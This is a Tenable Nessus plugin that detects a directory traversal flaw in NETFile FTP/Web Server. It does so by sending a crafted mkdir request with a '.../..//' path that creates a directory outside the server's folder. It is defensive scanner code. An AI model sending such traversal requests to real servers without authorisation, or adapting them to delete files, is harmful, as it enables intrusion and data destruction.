#
# (C) Tenable Network Security
#
# 

  desc["english"] = "
The version of NETFile FTP/Web server installed on the remote host is
prone to directory traversal attacks.  Specifically, an attacker can
create directories outside the server's folder path with a
specially-crafted URL, and he may be able to delete arbitrary files
and directories on the remote host too. 

Solution : Configure NETFile with tighter file and folder rights for
users and groups.  Or upgrade to NETFile FTP/Web Server version 7.5.0
Beta 7 or later. 

Risk factor : High";


if (description) {
  script_id(18223);
  script_version("$Revision: 1.1 $");

  script_bugtraq_id(13388);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"15914");
  }

  name["english"] = "NETFile FTP/Web Server Directory Traversal Vulnerabilities";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for directory traversal vulnerabilities in NETFile FTP/Web Server";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


# Make sure the server's banner indicates it's from NETFile.
port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
banner = get_http_banner(port:port);
if (!banner || banner !~ "^Server: Fastream NETFile") exit(0);

if ( safe_checks() ) exit(0);


# Try to create a random directory alongside NETFile's folder path.
dir = string(SCRIPT_NAME, "-", rand_str());
req = http_get(
  item:string(
    "/?",
    "command=mkdir&",
    "filename=.../..//a/.../", dir
  ), 
  port:port
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (
  res && 
  egrep(string:res, pattern:string(dir, '": folder created\\.'), icase:TRUE)
) {
  desc = str_replace(
    string:desc["english"],
    find:"Solution :",
    replace:string(
      "**** Nessus has successfully exploited this vulnerability by adding the\n",
      "**** directory ../", dir, " relative to NETFile's folder path\n",
      "**** on the remote host; you may wish to remove it at your convenience.\n",
      "\n",
      "Solution :"
    )
  );
  security_hole(port:port, data:desc);
}
